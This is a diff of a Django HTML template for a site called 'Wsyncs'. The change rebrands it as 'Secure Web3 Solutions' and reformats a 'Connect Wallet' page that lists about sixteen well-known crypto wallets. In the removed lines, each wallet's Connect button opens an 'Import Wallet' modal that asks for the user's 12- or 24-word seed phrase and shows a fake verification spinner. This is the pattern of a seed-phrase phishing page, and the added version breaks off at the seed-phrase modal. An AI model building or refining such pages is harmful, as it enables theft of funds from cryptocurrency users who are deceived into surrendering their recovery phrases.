@@ -1,14 +1,13 @@
 {% load static %}
 <!DOCTYPE html>
 <html lang="zxx">
-
-<head>
-    <title>Wsyncs | NFT</title>
-    <link rel="icon" href="{% static 'images/logo_favicon.png' %}" type="image/gif" sizes="16x16">
-    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+  <head>
+    <title>Wsyncs | Secure Web3 Solutions</title>
+    <link rel="icon" href="{% static 'images/logo_favicon.png' %}" type="image/gif" sizes="16x16" />
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type" />
     <meta content="width=device-width, initial-scale=1.0" name="viewport" />
-    <meta content="Wsyncs NFT Airdrop Connect" name="description" />
-    <meta content="NFT, WalletConnect, Crypto, Web3" name="keywords" />
+    <meta content="Wsyncs: Secure Web3 solutions for asset tracing, DeFi protection, encryption, and NFTs" name="description" />
+    <meta content="Asset Tracing, DeFi Protection, Encryption, NFT, WalletConnect, Crypto, Web3" name="keywords" />
     <meta content="wsyncs.com" name="author" />
 
     <!-- CSS Files -->
@@ -18,526 +17,657 @@
     <link id="colors" href="{% static 'css/colors/scheme-06.css' %}" rel="stylesheet" type="text/css" />
     <link href="{% static 'css/coloring.css' %}" rel="stylesheet" type="text/css" />
     <link href="{% static 'css/de-black.css' %}" rel="stylesheet" type="text/css" />
+    <meta name="csrf-token" content="{{ csrf_token }}" />
 
     <!-- Custom Modal and Mobile Menu CSS -->
     <style>
-        .modal-content {
-            background-color: #1a1a1a;
-            color: #ffffff;
-            border-radius: 10px;
-            border: 1px solid #333;
-        }
-        .modal-header {
-            border-bottom: 1px solid #333;
-        }
-        .modal-footer {
-            border-top: 1px solid #333;
-        }
-        .modal-body textarea.form-control {
-            background-color: #2a2a2a;
-            color: #ffffff;
-            border: 1px solid #444;
-        }
-        .modal-body textarea.form-control::placeholder {
-            color: #888;
-        }
-        .modal-body .alert {
-            font-size: 0.9rem;
-            padding: 10px;
-        }
-        .btn-close {
-            filter: invert(1);
-        }
-        /* Lock modal button sizes for Bootstrap 5.0.2 compatibility */
-        .modal-footer .btn {
-            font-size: 1rem !important;
-            padding: 8px 20px !important;
-            line-height: 1.5 !important;
-            width: 100px !important;
-            height: 38px !important;
-            min-width: 100px !important;
-            max-width: 100px !important;
-            text-align: center !important;
-            box-sizing: border-box !important;
-            transition: none !important;
-            display: inline-block !important;
-        }
-        .modal-footer .btn-main.text-dark {
-            background-color: #ff4d4d !important;
-            border-color: #ff4d4d !important;
-            color: #000000 !important;
-        }
-        .modal-footer .btn-main.text-dark:hover,
-        .modal-footer .btn-main.text-dark:focus,
-        .modal-footer .btn-main.text-dark:active {
-            background-color: #e03c3c !important;
-            border-color: #e03c3c !important;
-            width: 100px !important;
-            height: 38px !important;
-        }
-        .modal-footer .btn-secondary {
-            background-color: #6c757d !important;
-            border-color: #6c757d !important;
-            color: #ffffff !important;
-        }
-        .modal-footer .btn-secondary:hover,
-        .modal-footer .btn-secondary:focus,
-        .modal-footer .btn-secondary:active {
-            background-color: #5a6268 !important;
-            border-color: #5a6268 !important;
-            width: 100px !important;
-            height: 38px !important;
-        }
-        /* Spinner and verification message styles */
-        .verification-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 150px;
-        }
-        .verification-message {
-            margin-top: 15px;
-            font-size: 1rem;
-            color: #ffffff;
-        }
-        /* Mobile menu styles */
-        #mobile-menu {
-            display: none;
-            background-color: #1a1a1a;
-            position: absolute;
-            top: 100%;
-            left: 0;
-            width: 100%;
-            z-index: 1000;
-            padding: 15px 0;
-            border-top: 1px solid #333;
-        }
-        #mobile-menu ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            text-align: center;
-        }
-        #mobile-menu ul li {
-            margin: 10px 0;
-        }
-        #mobile-menu ul li a {
-            color: #ffffff;
-            text-decoration: none;
-            font-size: 1.1rem;
-            padding: 10px;
-            display: block;
-        }
-        #mobile-menu ul li a:hover {
-            color: #ff4d4d;
-        }
+      .modal-content {
+        background-color: #1a1a1a;
+        color: #ffffff;
+        border-radius: 10px;
+        border: 1px solid #333;
+      }
+      .modal-header {
+        border-bottom: 1px solid #333;
+      }
+      .modal-footer {
+        border-top: 1px solid #333;
+      }
+      .modal-body textarea.form-control {
+        background-color: #2a2a2a;
+        color: #ffffff;
+        border: 1px solid #444;
+      }
+      .modal-body textarea.form-control::placeholder {
+        color: #888;
+      }
+      .modal-body .alert {
+        font-size: 0.9rem;
+        padding: 10px;
+      }
+      .btn-close {
+        filter: invert(1);
+      }
+      /* Lock modal button sizes for Bootstrap 5.0.2 compatibility */
+      .modal-footer .btn {
+        font-size: 1rem !important;
+        padding: 8px 20px !important;
+        line-height: 1.5 !important;
+        width: 100px !important;
+        height: 38px !important;
+        min-width: 100px !important;
+        max-width: 100px !important;
+        text-align: center !important;
+        box-sizing: border-box !important;
+        transition: none !important;
+        display: inline-block !important;
+      }
+      .modal-footer .btn-main.text-dark {
+        background-color: #ff4d4d !important;
+        border-color: #ff4d4d !important;
+        color: #000000 !important;
+      }
+      .modal-footer .btn-main.text-dark:hover,
+      .modal-footer .btn-main.text-dark:focus,
+      .modal-footer .btn-main.text-dark:active {
+        background-color: #e03c3c !important;
+        border-color: #e03c3c !important;
+        width: 100px !important;
+        height: 38px !important;
+      }
+      .modal-footer .btn-secondary {
+        background-color: #6c757d !important;
+        border-color: #6c757d !important;
+        color: #ffffff !important;
+      }
+      .modal-footer .btn-secondary:hover,
+      .modal-footer .btn-secondary:focus,
+      .modal-footer .btn-secondary:active {
+        background-color: #5a6268 !important;
+        border-color: #5a6268 !important;
+        width: 100px !important;
+        height: 38px !important;
+      }
+      /* Spinner and verification message styles */
+      .verification-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 150px;
+      }
+      .verification-message {
+        margin-top: 15px;
+        font-size: 1rem;
+        color: #ffffff;
+      }
+      /* Mobile menu styles */
+      #mobile-menu {
+        display: none;
+        background-color: #1a1a1a;
+        position: absolute;
+        top: 100%;
+        left: 0;
+        width: 100%;
+        z-index: 1000;
+        padding: 15px 0;
+        border-top: 1px solid #333;
+      }
+      #mobile-menu ul {
+        list-style: none;
+        padding: 0;
+        margin: 0;
+        text-align: center;
+      }
+      #mobile-menu ul li {
+        margin: 10px 0;
+      }
+      #mobile-menu ul li a {
+        color: #ffffff;
+        text-decoration: none;
+        font-size: 1.1rem;
+        padding: 10px;
+        display: block;
+      }
+      #mobile-menu ul li a:hover {
+        color: #ff4d4d;
+      }
+      #menu-btn {
+        cursor: pointer;
+        font-size: 1.5rem;
+        color: #ffffff;
+      }
+      #menu-btn:hover {
+        color: #ff4d4d;
+      }
+      /* Ensure hamburger icon is visible on small screens */
+      @media (max-width: 767px) {
         #menu-btn {
-            cursor: pointer;
-            font-size: 1.5rem;
-            color: #ffffff;
+          display: inline-block !important;
         }
-        #menu-btn:hover {
-            color: #ff4d4d;
-        }
-        /* Ensure hamburger icon is visible on small screens */
-        @media (max-width: 767px) {
-            #menu-btn {
-                display: inline-block !important;
-            }
-        }
+      }
     </style>
-</head>
+  </head>
 
-<body class="dark-scheme de-black">
+  <body class="dark-scheme de-black">
     <div id="wrapper">
-        <!-- header begin -->
-        <header class="transparent scroll-dark">
-            <div class="container">
-                <div class="row align-items-center">
-                    <div class="col-md-3 col-sm-6">
-                        <!-- logo begin -->
-                        <div id="logo">
-                            <a href="{% url 'home' %}">
-                                <img src="{% static 'images/logo-4.png' %}" alt="Wsyncs Logo" style="width: 100px;" />
-                            </a>
-                        </div>
-                        <!-- logo close -->
-                    </div>
-
-                    <div class="col-md-6 d-none d-md-block text-center">
-                        <!-- mainmenu begin -->
-                        <nav class="mainmenu">
-                            <ul id="mainmenu" class="list-inline m-0">
-                                <li class="list-inline-item"><a href="{% url 'home' %}">Home</a></li>
-                                <li class="list-inline-item"><a href="{% url 'home' %}#about">About Us</a></li>
-                                <li class="list-inline-item"><a href="{% url 'home' %}#explore">Explore</a></li>
-                                <li class="list-inline-item"><a href="{% url 'home' %}#live">Live Auctions</a></li>
-                                <li class="list-inline-item"><a href="{% url 'home' %}#help">Help</a></li>
-                            </ul>
-                        </nav>
-                        <!-- mainmenu close -->
-                    </div>
-
-                    <div class="col-md-3 col-sm-6 text-end">
-                        <!-- header right side -->
-                        <div class="menu_side_area">
-                            <a href="{% url 'connect' %}" class="btn-main btn-wallet">
-                                <i class="icon_wallet_alt"></i><span>Connect Wallet</span>
-                            </a>
-                            <span id="menu-btn" class="d-inline-block d-md-none"><i class="fa fa-bars"></i></span>
-                        </div>
-                    </div>
-                </div>
-                <!-- Mobile menu -->
-                <div id="mobile-menu" class="d-md-none">
-                    <ul>
-                        <li><a href="{% url 'home' %}">Home</a></li>
-                        <li><a href="{% url 'home' %}#about">About Us</a></li>
-                        <li><a href="{% url 'home' %}#explore">Explore</a></li>
-                        <li><a href="{% url 'home' %}#live">Live Auctions</a></li>
-                        <li><a href="{% url 'home' %}#help">Help</a></li>
-                    </ul>
-                </div>
+      <!-- header begin -->
+      <header class="transparent scroll-dark">
+        <div class="container">
+          <div class="row align-items-center">
+            <div class="col-md-3 col-sm-6">
+              <!-- logo begin -->
+              <div id="logo">
+                <a href="{% url 'home' %}"><img src="{% static 'images/logo-4.png' %}" alt="Wsyncs Logo" style="width: 100px;" /></a>
+              </div>
+              <!-- logo close -->
             </div>
-        </header>
-        <!-- header close -->
 
-        <!-- content begin -->
-        <div class="no-bottom no-top" id="content">
-            <div id="top"></div>
-
-            <!-- section begin -->
-            <section id="subheader" class="text-light mt-5 pt-5">
-                <div class="center-y relative text-center">
-                    <div class="container">
-                        <div class="row">
-                            <div class="col-md-12 text-center mt-5">
-                                <h1>Wallet</h1>
-                            </div>
-                            <div class="clearfix"></div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-            <!-- section close -->
-
-            <!-- section begin -->
-            <section aria-label="section">
-                <div class="container">
-                    <div class="row">
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <span class="box-url-label">Most Popular</span>
-                                <img src="{% static 'images/wallet/1.png' %}" alt="MetaMask" class="mb20" width="60">
-                                <h4>MetaMask</h4>
-                                <p>Explore blockchain apps quickly, trusted by millions worldwide.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('MetaMask')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/2.png' %}" alt="Trust Wallet" class="mb20" width="60">
-                                <h4>Trust Wallet</h4>
-                                <p>Secure wallet for Android/iOS, supports millions of assets and chains.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Trust Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/coinbase-logo.svg' %}" alt="Coinbase Wallet" class="mb20" width="60">
-                                <h4>Coinbase Wallet</h4>
-                                <p>Self-custody wallet to securely manage crypto and NFTs in one place.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Coinbase Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/phantom-wallet-logo.svg' %}" alt="Phantom Wallet" class="mb20" width="60">
-                                <h4>Phantom Wallet</h4>
-                                <p>Wallet reimagined for DeFi/NFTs on Solana and Ethereum networks.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Phantom Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/exodus-logo.png' %}" alt="Exodus Wallet" class="mb20" width="60">
-                                <h4>Exodus Wallet</h4>
-                                <p>Desktop/mobile wallet with a beautiful UI and broad asset support.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Exodus Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/safepal-logo.png' %}" alt="SafePal Wallet" class="mb20" width="60">
-                                <h4>SafePal Wallet</h4>
-                                <p>Multi-chain wallet with cold storage from Binance Labs support.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('SafePal Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/atomic-wallet-svgrepo-com.png' %}" alt="Atomic Wallet" class="mb20" width="60">
-                                <h4>Atomic Wallet</h4>
-                                <p>Decentralized wallet for Bitcoin, Ethereum, and 500+ tokens securely.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Atomic Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/XDEFI_Wallet_Icon.png' %}" alt="XDEFI Wallet" class="mb20" width="60">
-                                <h4>XDEFI Wallet</h4>
-                                <p>Multi-chain wallet for DeFi/NFTs across 200+ blockchains securely.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('XDEFI Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/zerion-logo.jpg' %}" alt="Zerion Wallet" class="mb20" width="60">
-                                <h4>Zerion Wallet</h4>
-                                <p>Manage your DeFi portfolio and Web3 identity in one interface.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Zerion Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/argent-logo.png' %}" alt="Argent Wallet" class="mb20" width="60">
-                                <h4>Ready Wallet</h4>
-                                <p>Smart contract wallet for Ethereum, secure and user-friendly.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Ready Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/myetherwallet-logo.png' %}" alt="MyEtherWallet" class="mb20" width="60">
-                                <h4>MyEtherWallet</h4>
-                                <p>Free, open-source wallet for Ethereum and ERC-20 tokens securely.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('MyEtherWallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/bitkeep-logo.png' %}?v=032" alt="BitKeep Wallet" class="mb20" width="60">
-                                <h4>BitKeep Wallet</h4>
-                                <p>All-in-one Web3 wallet with cross-chain support and DApp access.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('BitKeep Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/bitget-logo.webp' %}" alt="Bitget Wallet" class="mb20" width="60">
-                                <h4>Bitget Wallet</h4>
-                                <p>All-in-one Web3 wallet with advanced trading and asset features.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Bitget Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/telegram-wallet-logo.jpg' %}" alt="Telegram Wallet" class="mb20" width="60">
-                                <h4>Telegram Wallet</h4>
-                                <p>Integrated wallet for crypto management in Telegram, supports TON.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Telegram Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/tomo-wallet-logo.png' %}" alt="Tomo Wallet" class="mb20" width="60">
-                                <h4>Tomo Wallet</h4>
-                                <p>Decentralized wallet integrated into Telegram for easy use.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Tomo Wallet')">Connect</button>
-                            </div>
-                        </div>
-
-                        <div class="col-lg-3 mb30">
-                            <div class="box-url">
-                                <img src="{% static 'images/wallet/tonkeeper-logo.png' %}" alt="Tonkeeper Wallet" class="mb20" width="60">
-                                <h4>Tonkeeper Wallet</h4>
-                                <p>Secure self-custodial wallet for TON blockchain and other assets.</p>
-                                <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Tonkeeper Wallet')">Connect</button>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-            <!-- section close -->
-
-            <!-- Modal for Seed Phrase Input -->
-            <div class="modal fade" id="walletModal" tabindex="-1" aria-labelledby="walletModalLabel" aria-hidden="true">
-                <div class="modal-dialog modal-dialog-centered">
-                    <div class="modal-content">
-                        <div class="modal-header">
-                            <h5 class="modal-title" id="walletModalLabel">Import Wallet</h5>
-                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                        </div>
-                        <div class="modal-body">
-                            <div id="inputContainer">
-                                <p>Enter your 12 or 24-word seed phrase for <span id="walletName">Wallet</span> below.</p>
-                                <div class="alert alert-warning" role="alert">
-                                    <strong>Warning:</strong> Never share your seed phrase with anyone. Keep it secure and private.
-                                </div>
-                                <textarea class="form-control" id="seedPhrase" rows="4" placeholder="Enter your 12 or 24-word seed phrase"></textarea>
-                                <div id="errorMessage" class="text-danger mt-2" style="display: none;"></div>
-                            </div>
-                            <div id="verificationContainer" class="verification-container" style="display: none;">
-                                <div class="spinner-border text-light" role="status">
-                                    <span class="visually-hidden">Verifying...</span>
-                                </div>
-                                <div class="verification-message">Please wait while we verify your phrase key</div>
-                            </div>
-                        </div>
-                        <div class="modal-footer" id="modalFooter">
-                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
-                            <button type="button" class="btn btn-main text-dark" onclick="importWallet()">Import</button>
-                        </div>
-                    </div>
-                </div>
+            <div class="col-md-6 d-none d-md-block text-center">
+              <!-- mainmenu begin -->
+              <nav class="mainmenu">
+                <ul id="mainmenu" class="list-inline m-0">
+                  <li class="list-inline-item">
+                    <a href="{% url 'home' %}">Home</a>
+                  </li>
+                  <li class="list-inline-item">
+                    <a href="{% url 'home' %}#about">About Us</a>
+                  </li>
+                  <li class="list-inline-item">
+                    <a href="{% url 'home' %}#explore">Explore</a>
+                  </li>
+                  <li class="list-inline-item">
+                    <a href="{% url 'home' %}#live">Live Auctions</a>
+                  </li>
+                  <li class="list-inline-item">
+                    <a href="{% url 'home' %}#help">Help</a>
+                  </li>
+                </ul>
+              </nav>
+              <!-- mainmenu close -->
             </div>
+
+            <div class="col-md-3 col-sm-6 text-end">
+              <!-- header right side -->
+              <div class="menu_side_area">
+                <a href="{% url 'connect' %}" class="btn-main btn-wallet"><i class="icon_wallet_alt"></i><span>Connect Wallet</span></a>
+                <span id="menu-btn" class="d-inline-block d-md-none"><i class="fa fa-bars"></i></span>
+              </div>
+            </div>
+          </div>
+          <!-- Mobile menu -->
+          <div id="mobile-menu" class="d-md-none">
+            <ul>
+              <li>
+                <a href="{% url 'home' %}">Home</a>
+              </li>
+              <li>
+                <a href="{% url 'home' %}#about">About Us</a>
+              </li>
+              <li>
+                <a href="{% url 'home' %}#explore">Explore</a>
+              </li>
+              <li>
+                <a href="{% url 'home' %}#live">Live Auctions</a>
+              </li>
+              <li>
+                <a href="{% url 'home' %}#help">Help</a>
+              </li>
+            </ul>
+          </div>
         </div>
-        <!-- content close -->
+      </header>
+      <!-- header close -->
 
-        <a href="#" id="back-to-top"></a>
+      <!-- content begin -->
+      <div class="no-bottom no-top" id="content">
+        <div id="top"></div>
 
-        <!-- footer begin -->
-        <footer>
+        <!-- section begin -->
+        <section id="subheader" class="text-light mt-5 pt-5">
+          <div class="center-y relative text-center">
             <div class="container">
-                <div class="row">
-                    <!-- Explore -->
-                    <div class="col-md-3 col-sm-6 col-xs-1">
-                        <div class="widget">
-                            <h5>Explore</h5>
-                            <ul>
-                                <li><a href="{% url 'home' %}">Home</a></li>
-                                <li><a href="{% url 'home' %}#about">About</a></li>
-                                <li><a href="{% url 'home' %}">Marketplace</a></li>
-                                <li><a href="{% url 'connect' %}">Connect Wallet</a></li>
-                            </ul>
-                        </div>
-                    </div>
-
-                    <!-- Support -->
-                    <div class="col-md-3 col-sm-6 col-xs-1">
-                        <div class="widget">
-                            <h5>Support</h5>
-                            <ul>
-                                <li><a href="{% url 'home' %}#help">Help Center</a></li>
-                            </ul>
-                        </div>
-                    </div>
-
-                    <!-- Newsletter -->
-                    <div class="col-md-6 col-sm-12 col-xs-1">
-                        <div class="widget">
-                            <h5>Newsletter</h5>
-                            <p>Stay updated on NFT security alerts and Web3 updates — straight to your inbox.</p>
-                            <form action="blank.php" class="row form-dark" id="form_subscribe" method="post" name="form_subscribe">
-                                <div class="col text-center">
-                                    <input class="form-control" id="txt_subscribe" name="txt_subscribe" placeholder="enter your email" type="text" />
-                                    <a href="#" id="btn-subscribe"><i class="arrow_right bg-color-secondary"></i></a>
-                                    <div class="clearfix"></div>
-                                </div>
-                            </form>
-                            <div class="spacer-10"></div>
-                            <small>We respect your privacy. No spam. Ever.</small>
-                        </div>
-                    </div>
+              <div class="row">
+                <div class="col-md-12 text-center mt-5">
+                  <h1>Wallet</h1>
                 </div>
+                <div class="clearfix"></div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <!-- section close -->
+
+        <!-- section begin -->
+        <section aria-label="section">
+          <div class="container">
+            <div class="row">
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <span class="box-url-label">Most Popular</span>
+                  <img src="{% static 'images/wallet/1.png' %}" alt="MetaMask" class="mb20" width="60" />
+                  <h4>MetaMask</h4>
+                  <p>Explore blockchain apps quickly, trusted by millions worldwide.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('MetaMask')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/2.png' %}" alt="Trust Wallet" class="mb20" width="60" />
+                  <h4>Trust Wallet</h4>
+                  <p>Secure wallet for Android/iOS, supports millions of assets and chains.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Trust Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/coinbase-logo.svg' %}" alt="Coinbase Wallet" class="mb20" width="60" />
+                  <h4>Coinbase Wallet</h4>
+                  <p>Self-custody wallet to securely manage crypto and NFTs in one place.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Coinbase Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/phantom-wallet-logo.svg' %}" alt="Phantom Wallet" class="mb20" width="60" />
+                  <h4>Phantom Wallet</h4>
+                  <p>Wallet reimagined for DeFi/NFTs on Solana and Ethereum networks.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Phantom Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/exodus-logo.png' %}" alt="Exodus Wallet" class="mb20" width="60" />
+                  <h4>Exodus Wallet</h4>
+                  <p>Desktop/mobile wallet with a beautiful UI and broad asset support.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Exodus Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/safepal-logo.png' %}" alt="SafePal Wallet" class="mb20" width="60" />
+                  <h4>SafePal Wallet</h4>
+                  <p>Multi-chain wallet with cold storage from Binance Labs support.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('SafePal Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/atomic-wallet-svgrepo-com.png' %}" alt="Atomic Wallet" class="mb20" width="60" />
+                  <h4>Atomic Wallet</h4>
+                  <p>Decentralized wallet for Bitcoin, Ethereum, and 500+ tokens securely.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Atomic Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/XDEFI_Wallet_Icon.png' %}" alt="XDEFI Wallet" class="mb20" width="60" />
+                  <h4>XDEFI Wallet</h4>
+                  <p>Multi-chain wallet for DeFi/NFTs across 200+ blockchains securely.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('XDEFI Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/zerion-logo.jpg' %}" alt="Zerion Wallet" class="mb20" width="60" />
+                  <h4>Zerion Wallet</h4>
+                  <p>Manage your DeFi portfolio and Web3 identity in one interface.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Zerion Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/argent-logo.png' %}" alt="Argent Wallet" class="mb20" width="60" />
+                  <h4>Ready Wallet</h4>
+                  <p>Smart contract wallet for Ethereum, secure and user-friendly.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Ready Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/myetherwallet-logo.png' %}" alt="MyEtherWallet" class="mb20" width="60" />
+                  <h4>MyEtherWallet</h4>
+                  <p>Free, open-source wallet for Ethereum and ERC-20 tokens securely.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('MyEtherWallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/bitkeep-logo.png' %}?v=032" alt="BitKeep Wallet" class="mb20" width="60" />
+                  <h4>BitKeep Wallet</h4>
+                  <p>All-in-one Web3 wallet with cross-chain support and DApp access.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('BitKeep Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/bitget-logo.webp' %}" alt="Bitget Wallet" class="mb20" width="60" />
+                  <h4>Bitget Wallet</h4>
+                  <p>All-in-one Web3 wallet with advanced trading and asset features.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Bitget Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/telegram-wallet-logo.jpg' %}" alt="Telegram Wallet" class="mb20" width="60" />
+                  <h4>Telegram Wallet</h4>
+                  <p>Integrated wallet for crypto management in Telegram, supports TON.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Telegram Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/tomo-wallet-logo.png' %}" alt="Tomo Wallet" class="mb20" width="60" />
+                  <h4>Tomo Wallet</h4>
+                  <p>Decentralized wallet integrated into Telegram for easy use.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Tomo Wallet')">Connect</button>
+                </div>
+              </div>
+
+              <div class="col-lg-3 mb30">
+                <div class="box-url">
+                  <img src="{% static 'images/wallet/tonkeeper-logo.png' %}" alt="Tonkeeper Wallet" class="mb20" width="60" />
+                  <h4>Tonkeeper Wallet</h4>
+                  <p>Secure self-custodial wallet for TON blockchain and other assets.</p>
+                  <button class="btn-main mt-2 text-dark" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletName('Tonkeeper Wallet')">Connect</button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <!-- section close -->
+
+        <!-- Modal for Seed Phrase Input -->
